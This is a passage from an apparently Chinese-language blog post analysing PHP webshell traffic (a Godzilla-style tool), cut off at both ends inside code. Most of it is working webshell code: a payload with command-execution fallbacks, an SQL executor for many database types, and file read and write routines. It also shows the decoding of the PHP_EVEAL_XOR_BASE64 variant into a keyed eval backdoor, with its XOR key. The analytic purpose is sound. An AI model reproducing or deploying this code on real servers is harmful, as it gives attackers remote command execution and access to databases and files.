punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".log\"</span><span class=\"token punctuation\">;</span> @<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$commandFile</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$cmdLine</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span><span class=\"token function\">pcntl_fork</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token variable\">$args</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"-c\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$cmdLine</span></span> &gt; <span class=\"token interpolation\"><span class=\"token variable\">$resultFile</span></span>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">pcntl_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$args</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// the child will only reach this point on exec failure, // because execution shifts to the pcntl_exec()ed command exit(0); default: break; } if (!file_exists($resultFile)){ sleep(2); } $result=file_get_contents($resultFile); @unlink($commandFile); @unlink($resultFile); }elseif(($result=runshellshock(__FILE__, $cmdLine)!==false)) { }else{ return \"none of proc_open/passthru/shell_exec/exec/exec/popen/COM/runshellshock/pcntl_exec is available\"; } $result .= @ob_get_contents(); @ob_end_clean(); return $result; } function execSql(){ $dbType=get(\"dbType\"); $dbHost=get(\"dbHost\"); $dbPort=get(\"dbPort\"); $username=get(\"dbUsername\"); $password=get(\"dbPassword\"); $execType=get(\"execType\"); $execSql=get(\"execSql\"); $charset=get(\"dbCharset\"); $currentDb=get(\"currentDb\"); function mysqli_exec($host,$port,$username,$password,$execType,$currentDb,$sql,$charset){ // 创建连接 $conn = new mysqli($host,$username,$password,\"\",$port); // Check connection if ($conn-&gt;connect_error) { return $conn-&gt;connect_error; } if (!empty($charset)){ $conn-&gt;set_charset($charset); } if (!empty($currentDb)){ $conn-&gt;select_db($currentDb); } $result = $conn-&gt;query($sql); if ($conn-&gt;error){ return $conn-&gt;error; } if ($execType==\"update\"){ return \"Query OK, \".$conn-&gt;affected_rows.\" rows affected\"; }else{ $data=\"ok\\n\"; while ($column = $result-&gt;fetch_field()){ $data.=base64_encode($column-&gt;name).\"\\t\"; } $data.=\"\\n\"; if ($result-&gt;num_rows &gt; 0) { while($row = $result-&gt;fetch_assoc()) { foreach ($row as $value){ $data.=base64_encode($value).\"\\t\"; } $data.=\"\\n\"; } } return $data; } } function mysql_exec($host, $port, $username, $password, $execType, $currentDb,$sql,$charset) { $con = @mysql_connect($host.\":\".$port, $username, $password); if (!$con) { return mysql_error(); } else { if (!empty($charset)){ mysql_set_charset($charset,$con); } if (!empty($currentDb)){ if (function_existsEx(\"mysql_selectdb\")){ mysql_selectdb($currentDb,$con); }elseif (function_existsEx(\"mysql_select_db\")){ mysql_select_db($currentDb,$con); } } $result = @mysql_query($sql); if (!$result) { return mysql_error(); } if ($execType == \"update\") { return \"Query OK, \".mysql_affected_rows($con).\" rows affected\"; } else { $data = \"ok\\n\"; for ($i = 0; $i &lt; mysql_num_fields($result); $i++) { $data.= base64_encode(mysql_field_name($result, $i)).\"\\t\"; } $data.= \"\\n\"; $rowNum = mysql_num_rows($result); if ($rowNum &gt; 0) { while ($row = mysql_fetch_row($result)) { foreach($row as $value) { $data.= base64_encode($value).\"\\t\"; } $data.= \"\\n\"; } } } @mysql_close($con); return $data; } } function mysqliEx_exec($host, $port, $username, $password, $execType, $currentDb,$sql,$charset){ $port == \"\" ? $port = \"3306\" : $port; $T=@mysqli_connect($host,$username,$password,\"\",$port); if (!empty($charset)){ @mysqli_set_charset($charset); } if (!empty($currentDb)){ @mysqli_select_db($T,$currentDb); } $q=@mysqli_query($T,$sql); if(is_bool($q)){ return mysqli_error($T); }else{ if (mysqli_num_fields($q)&gt;0){ $i=0; $data = \"ok\\n\"; while($col=@mysqli_fetch_field($q)){ $data.=base64_encode($col-&gt;name).\"\\t\"; $i++; } $data.=\"\\n\"; while($rs=@mysqli_fetch_row($q)){ for($c=0;$c&lt;$i;$c++){ $data.=base64_encode(trim($rs[$c])).\"\\t\"; } $data.=\"\\n\"; } return $data; }else{ return \"Query OK, \".@mysqli_affected_rows($T).\" rows affected\"; } } } function pg_execEx($host, $port, $username, $password, $execType,$currentDb, $sql,$charset){ $port == \"\" ? $port = \"5432\" : $port; $arr=array( 'host'=&gt;$host, 'port'=&gt;$port, 'user'=&gt;$username, 'password'=&gt;$password ); if (!empty($currentDb)){ $arr[\"dbname\"]=$currentDb; } $cs=''; foreach($arr as $k=&gt;$v) { if(empty($v)){ continue; } $cs .= \"$k=$v \"; } $T=@pg_connect($cs); if(!$T){ return @pg_last_error(); }else{ if (!empty($charset)){ @pg_set_client_encoding($T,$charset); } $q=@pg_query($T, $sql); if(!$q){ return @pg_last_error(); }else{ $n=@pg_num_fields($q); if($n===NULL){ return @pg_last_error(); }elseif($n===0){ return \"Query OK, \".@pg_affected_rows($q).\" rows affected\"; }else{ $data = \"ok\\n\"; for($i=0;$i&lt;$n;$i++){ $data.=base64_encode(@pg_field_name($q,$i)).\"\\t\"; } $data.= \"\\n\"; while($row=@pg_fetch_row($q)){ for($i=0;$i&lt;$n;$i++){ $data.=base64_encode($row[$i]!==NULL?$row[$i]:\"NULL\").\"\\t\"; } $data.= \"\\n\"; } return $data; } } } } function sqlsrv_exec($host, $port, $username, $password, $execType, $currentDb,$sql){ $dbConfig=array(\"UID\"=&gt; $username,\"PWD\"=&gt;$password); if (!empty($currentDb)){ $dbConfig[\"Database\"]=$currentDb; } $T=@sqlsrv_connect($host,$dbConfig); $q=@sqlsrv_query($T,$sql,null); if($q!==false){ $i=0; $fm=@sqlsrv_field_metadata($q); if(empty($fm)){ $ar=@sqlsrv_rows_affected($q); return \"Query OK, \".$ar.\" rows affected\"; }else{ $data = \"ok\\n\"; foreach($fm as $rs){ $data.=base64_encode($rs['Name']).\"\\t\"; $i++; } $data.= \"\\n\"; while($rs=@sqlsrv_fetch_array($q,SQLSRV_FETCH_NUMERIC)){ for($c=0;$c&lt;$i;$c++){ $data.=base64_encode(trim($rs[$c])).\"\\t\"; } $data.= \"\\n\"; } return $data; } }else{ $err=\"\"; if(($e = sqlsrv_errors()) != null){ foreach($e as $v){ $err.=($e['message']).\"\\n\"; } } return $err; } } function mssql_exec($host, $port, $username, $password, $execType,$currentDb, $sql){ $T=@mssql_connect($host,$username,$password); if (!empty($currentDb)){ @mssql_select_db($currentDb); } $q=@mssql_query($sql,$T); if(is_bool($q)){ return \"Query OK, \".@mssql_rows_affected($T).\" rows affected\"; }else{ $data = \"ok\\n\"; $i=0; while($rs=@mssql_fetch_field($q)){ $data.=base64_encode($rs-&gt;name).\"\\t\"; $i++; } $data.=\"\\n\"; while($rs=@mssql_fetch_row($q)){ for($c=0;$c&lt;$i;$c++){ $data.=base64_encode(trim($rs[$c])).\"\\t\"; } $data.=\"\\n\"; } @mssql_free_result($q); @mssql_close($T); return $data; } } function oci_exec($host, $port, $username, $password, $execType, $currentDb, $sql, $charset) { $chs = $charset ? $charset : \"utf8\"; $mod = 0; $H = @oci_connect($username, $password, $host, $chs, $mod); if (!$H) { $errObj=@oci_error(); return $errObj[\"message\"]; } else { $q = @oci_parse($H, $sql); if (@oci_execute($q)) { $n = oci_num_fields($q); if ($n == 0) { return \"Query OK, \".@oci_num_rows($q).\" rows affected\"; } else { $data = \"ok\\n\"; for ($i = 1; $i &lt;= $n; $i++) { $data.= base64_encode(oci_field_name($q, $i)).\"\\t\"; } $data.= \"\\n\"; while ($row = @oci_fetch_array($q, OCI_ASSOC + OCI_RETURN_NULLS)) { foreach($row as $item) { $data.= base64_encode($item !== null ? base64_encode($item) : \"\"). \"\\t\"; } $data.= \"\\n\"; } return $data; } } else { $e = @oci_error($q); if ($e) { return \"ERROR://{$e['message']} in [{$e['sqltext']}] col:{$e['offset']}\"; } else { return \"false\"; } } } } function ora_exec($host, $port, $username, $password, $execType, $currentDb, $sql, $charset) { $H = @ora_plogon(\"{$username}@{$host}\", \"{$password}\"); if (!$H) { return \"Login Failed!\"; } else { $T = @ora_open($H); @ora_commitoff($H); $q = @ora_parse($T, \"{$sql}\"); $R = ora_exec($T); if ($R) { $n = ora_numcols($T); $data=\"ok\\n\"; for ($i = 0; $i &lt; $n; $i++) { $data.=base64_encode(Ora_ColumnName($T, $i)).\"\\t\"; } $data.=\"\\n\"; while (ora_fetch($T)) { for ($i = 0; $i &lt; $n; $i++) { $data.=base64_encode(trim(ora_getcolumn($T, $i))).\"\\t\"; } $data.=\"\\n\"; } return $data; } else { return \"false\"; } } } function sqlite_exec($host, $port, $username, $password, $execType, $currentDb, $sql, $charset) { $dbh=new SQLite3($host); if(!$dbh){ return \"ERROR://CONNECT ERROR\".SQLite3::lastErrorMsg(); }else{ $stmt=$dbh-&gt;prepare($sql); if(!$stmt){ return \"ERROR://\".$dbh-&gt;lastErrorMsg(); } else { $result=$stmt-&gt;execute(); if(!$result){ return $dbh-&gt;lastErrorMsg(); }else{ $bool=True; $data=\"ok\\n\"; while($res=$result-&gt;fetchArray(SQLITE3_ASSOC)){ if($bool){ foreach($res as $key=&gt;$value){ $data.=base64_encode($key).\"\\t\"; } $bool=False; $data.=\"\\n\"; } foreach($res as $key=&gt;$value){ $data.=base64_encode($value!==NULL?$value:\"NULL\").\"\\t\"; } $data.=\"\\n\"; } if($bool){ if(!$result-&gt;numColumns()){ return \"Query OK, \".$dbh-&gt;changes().\" rows affected\"; }else{ return \"ERROR://Table is empty.\"; } }else{ return $data; } } } $dbh-&gt;close(); } } function pdoExec($databaseType,$host,$port,$username,$password,$execType,$currentDb,$sql){ $conn=null; if ($databaseType===\"oracle\"){ $databaseType=\"orcl\"; } if (strpos($host,\"=\")!==false){ $conn = new PDO($host, $username, $password); }else if (!empty($currentDb)){ $conn = new PDO(\"{$databaseType}:host=$host;port={$port};dbname={$currentDb}\", $username, $password); }else{ $conn = new PDO(\"{$databaseType}:host=$host;port={$port};\", $username, $password); } $conn-&gt;setAttribute(3, 0); if ($execType==\"update\"){ $affectRows=$conn-&gt;exec($sql); if ($affectRows!==false){ return \"Query OK, \".$conn-&gt;exec($sql).\" rows affected\"; }else{ return \"Err-&gt;\\n\".implode(',',$conn-&gt;errorInfo()); } }else{ $data=\"ok\\n\"; $stm=$conn-&gt;prepare($sql); if ($stm-&gt;execute()){ $row=$stm-&gt;fetch(2); $_row=\"\\n\"; foreach (array_keys($row) as $key){ $data.=base64_encode($key).\"\\t\"; $_row.=base64_encode($row[$key]).\"\\t\"; } $data.=$_row.\"\\n\"; while ($row=$stm-&gt;fetch(2)){ foreach (array_keys($row) as $key){ $data.=base64_encode($row[$key]).\"\\t\"; } $data.=\"\\n\"; } return $data; }else{ return \"Err-&gt;\\n\".implode(',',$stm-&gt;errorInfo()); } } } if ($dbType==\"mysql\"&amp;&amp;(class_exists(\"mysqli\")||function_existsEx(\"mysql_connect\")||function_existsEx(\"mysqli_connect\"))){ if (class_exists(\"mysqli\")){ return mysqli_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); }elseif (function_existsEx(\"mysql_connect\")){ return mysql_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); }else if (function_existsEx(\"mysqli_connect\")){ return mysqliEx_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); } }elseif ($dbType==\"postgresql\"&amp;&amp;function_existsEx(\"pg_connect\")){ if (function_existsEx(\"pg_connect\")){ return pg_execEx($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); } }elseif ($dbType==\"sqlserver\"&amp;&amp;(function_existsEx(\"sqlsrv_connect\")||function_existsEx(\"mssql_connect\"))){ if (function_existsEx(\"sqlsrv_connect\")){ return sqlsrv_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql); }elseif (function_existsEx(\"mssql_connect\")){ return mssql_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql); } }elseif ($dbType==\"oracle\"&amp;&amp;(function_existsEx(\"oci_connect\")||function_existsEx(\"ora_plogon\"))){ if (function_existsEx(\"oci_connect\")){ return oci_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); }else if (function_existsEx(\"ora_plogon\")){ return oci_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); } }elseif ($dbType==\"sqlite\"&amp;&amp;class_exists(\"SQLite3\")){ return sqlite_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); } if (extension_loaded(\"pdo\")){ return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql); }else{ return \"no extension\"; } } function base64Encode($data){ return base64_encode($data); } function test(){ return \"ok\"; } function get($key){ global $parameters; if (isset($parameters[$key])){ return $parameters[$key]; }else{ return null; } } function getAllParameters(){ global $parameters; return $parameters; } function includeCode(){ $classCode=get(\"binCode\"); $codeName=get(\"codeName\"); $_SES=&amp;getSession(); $_SES[$codeName]=$classCode; return \"ok\"; } function base64Decode($string){ return base64_decode($string); } function convertFilePermissions($fileAttr){ $mod=0; if (strpos($fileAttr,'R')!==false){ $mod=$mod+0444; } if (strpos($fileAttr,'W')!==false){ $mod=$mod+0222; } if (strpos($fileAttr,'X')!==false){ $mod=$mod+0111; } return $mod; } function g_close(){ @session_start(); $_SES=&amp;getSession(); $_SES=null; if (@session_destroy()){ return \"ok\"; }else{ return \"fail!\"; } } function bigFileDownload(){ $mode=get(\"mode\"); $fileName=get(\"fileName\"); $readByteNum=get(\"readByteNum\"); $position=get(\"position\"); if ($mode==\"fileSize\"){ return @filesize($fileName).\"\"; }elseif ($mode==\"read\"){ if (function_existsEx(\"fopen\")&amp;&amp;function_existsEx(\"fread\")&amp;&amp;function_existsEx(\"fseek\")){ $handle=fopen($fileName,\"rb\"); if ($handle!==false){ @fseek($handle,$position); $data=fread($handle,$readByteNum); @fclose($handle); if ($data!==false){ return $data; }else{ return \"cannot read file\"; } }else{ return \"cannot open file\"; } }else if (function_existsEx(\"file_get_contents\")){ return file_get_contents($fileName,false,null,$position,$readByteNum); }else{ return \"no function\"; } }else{ return \"no mode\"; } } function bigFileUpload(){ $fileName=get(\"fileName\"); $fileContents=get(\"fileContents\"); $position=get(\"position\"); if(function_existsEx(\"fopen\")&amp;&amp;function_existsEx(\"fwrite\")&amp;&amp;function_existsEx(\"fseek\")){ $handle=fopen($fileName,\"ab\"); if ($handle!==false){ fseek($handle,$position); $len=fwrite($handle,$fileContents); @fclose($handle); if ($len!==false){ return \"ok\"; }else{ return \"cannot write file\"; } }else{ return \"cannot open file\"; } }else if (function_existsEx(\"file_put_contents\")){ if (file_put_contents($fileName,$fileContents,FILE_APPEND)!==false){ return \"ok\"; }else{ return \"writer fail\"; } }else{ return \"no function\"; } } function canCallGzipEncode(){ if (function_existsEx(\"gzencode\")){ return \"1\"; }else{ return \"0\"; } } function canCallGzipDecode(){ if (function_existsEx(\"gzdecode\")){ return \"1\"; }else{ return \"0\"; } } function bytesToInteger($bytes, $position) { $val = 0; $val = $bytes[$position + 3] &amp; 0xff; $val &lt;&lt;= 8; $val |= $bytes[$position + 2] &amp; 0xff; $val &lt;&lt;= 8; $val |= $bytes[$position + 1] &amp; 0xff; $val &lt;&lt;= 8; $val |= $bytes[$position] &amp; 0xff; return $val; } function isGzipStream($bin){ if (strlen($bin)&gt;=2){ $bin=substr($bin,0,2); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); switch ($typeCode) { case 31139: return true; default: return false; } }else{ return false; } } function getBytes($string) { $bytes = array(); for($i = 0; $i &lt; strlen($string); $i++){ array_push($bytes,ord($string[$i])); } return $bytes; }</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>内容包含了文件操作、执行命令等诸多模块，方便后续调用。</p>\n<h3 id=\"PHP-EVEAL-XOR-BASE64\"><a href=\"#PHP-EVEAL-XOR-BASE64\" class=\"headerlink\" title=\"PHP_EVEAL_XOR_BASE64\"></a>PHP_EVEAL_XOR_BASE64</h3><p>这个shell脚本并无特别，一句话脚本上传即可。在流上与PHP_XOR_BASE64上的区别很明显，PHP_XOR_BASE64是key=加密，PHP_EVEAL_XOR_BASE64是pass=加密&amp;key=加密，那么我们需要考虑的部分在于pass后面跟了什么内容由流可得：</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\">pass=eval%28base64_decode%28strrev%28urldecode%28%27\nurl解码：\npass=eval<span class=\"token punctuation\">(</span>base64_decode<span class=\"token punctuation\">(</span>strrev<span class=\"token punctuation\">(</span>urldecode<span class=\"token punctuation\">(</span>'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>即是这段加密信息解密的方法：</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\">K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>将加密url解密后：</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\">K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>再将代码逆序排列：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">DQpAc2Vzc2lvbl9zdGFydCgpOw0KQHNldF90aW1lX2xpbWl0KDApOw0KQGVycm9yX3JlcG9ydGluZygwKTsNCmZ1bmN0aW9uIGVuY29kZSgkRCwkSyl7DQogICAgZm9yKCRpPTA7JGk8c3RybGVuKCREKTskaSsrKSB7DQogICAgICAgICRjID0gJEtbJGkrMSYxNV07DQogICAgICAgICREWyRpXSA9ICREWyRpXV4kYzsNCiAgICB9DQogICAgcmV0dXJuICREOw0KfQ0KJHBhc3M9J2tleSc7DQokcGF5bG9hZE5hbWU9J3BheWxvYWQnOw0KJGtleT0nM2M2ZTBiOGE5YzE1MjI0YSc7DQppZiAoaXNzZXQoJF9QT1NUWyRwYXNzXSkpew0KICAgICRkYXRhPWVuY29kZShiYXNlNjRfZGVjb2RlKCRfUE9TVFskcGFzc10pLCRrZXkpOw0KICAgIGlmIChpc3NldCgkX1NFU1NJT05bJHBheWxvYWROYW1lXSkpew0KICAgICAgICAkcGF5bG9hZD1lbmNvZGUoJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV0sJGtleSk7DQogICAgICAgIGlmIChzdHJwb3MoJHBheWxvYWQsImdldEJhc2ljc0luZm8iKT09PWZhbHNlKXsNCiAgICAgICAgICAgICRwYXlsb2FkPWVuY29kZSgkcGF5bG9hZCwka2V5KTsNCiAgICAgICAgfQ0KCQlldmFsKCRwYXlsb2FkKTsNCiAgICAgICAgZWNobyBzdWJzdHIobWQ1KCRwYXNzLiRrZXkpLDAsMTYpOw0KICAgICAgICBlY2hvIGJhc2U2NF9lbmNvZGUoZW5jb2RlKEBydW4oJGRhdGEpLCRrZXkpKTsNCiAgICAgICAgZWNobyBzdWJzdHIobWQ1KCRwYXNzLiRrZXkpLDE2KTsNCiAgICB9ZWxzZXsNCiAgICAgICAgaWYgKHN0cnBvcygkZGF0YSwiZ2V0QmFzaWNzSW5mbyIpIT09ZmFsc2Upew0KICAgICAgICAgICAgJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV09ZW5jb2RlKCRkYXRhLCRrZXkpOw0KICAgICAgICB9DQogICAgfQ0KfQ0K<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>然后再base64解码：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">\n@<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n@<span class=\"token function\">set_time_limit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n@<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$D</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$K</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$D</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$K</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$D</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$D</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token operator\">^</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token keyword\">return</span> <span class=\"token variable\">$D</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$pass</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'key'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$payloadName</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'payload'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$key</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'3c6e0b8a9c15224a'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$pass</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n  <span class=\"token variable\">$data</span><span class=\"token operator\">=</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$pass</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$payloadName</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$payload</span><span class=\"token operator\">=</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$payloadName</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"getBasicsInfo\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n      <span class=\"token variable\">$payload</span><span class=\"token operator\">=</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pass</span><span class=\"token operator\">.</span><span 